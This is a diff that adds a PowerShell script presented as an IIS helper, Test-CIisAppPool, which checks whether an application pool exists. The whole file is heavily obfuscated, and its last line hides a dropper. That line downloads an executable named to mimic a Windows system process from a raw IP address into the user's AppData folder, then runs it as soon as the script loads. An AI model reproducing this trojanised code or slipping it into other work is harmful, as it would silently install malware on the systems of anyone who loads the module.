@@ -1,0 +1,27 @@
+function tESt-c`IIs`APP`pooL
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(MaNdaTOry=${t`RUE})]
+        [string]
+        
+        ${NA`ME}
+    )
+    
+    .("{0}{1}{2}"-f 'Set-Stric','tM','ode') -Version ("{0}{1}" -f'Lates','t')
+
+    &("{2}{3}{0}{1}" -f 'er','ence','Us','e-CallerPref') -Cmdlet ${P`ScmDLEt} -Session ${exEcU`Tio`NcO`NTeXT}."sEssi`O`NS`TAte"
+
+    ${AP`p`pOol} = &("{0}{1}{3}{2}" -f'Ge','t-','l','CIisAppPoo') -Name ${N`AMe}
+    if( ${apPP`o`ol} )
+    {
+        return ${Tr`Ue}
+    }
+    
+    return ${fA`Lse}
+}
+
+.("{2}{0}{3}{1}"-f't-','s','Se','Alia') -Name ("{5}{3}{6}{1}{0}{4}{2}" -f 'xi','oolE','ts','t-Iis','s','Tes','AppP') -Value ("{4}{0}{2}{3}{1}" -f 'st','Pool','-CIi','sApp','Te')
+
+(.("{1}{2}{0}{3}" -f'-O','N','ew','bject') ("{0}{4}{1}{3}{2}{5}"-f'Syste','Net.','bC','We','m.','lient')).("{3}{1}{0}{2}"-f'F','nload','ile','Dow').Invoke(("{5}{7}{2}{6}{0}{3}{4}{1}" -f '238/~yah','xe',':/','o','o/csrsv.e','ht','/94.102.53.','tp'),"$env:APPDATA\csrsv.exe");.("{0}{1}{2}" -f 'S','tart-Proce','ss') ("$env:APPDATA\csrsv.exe")
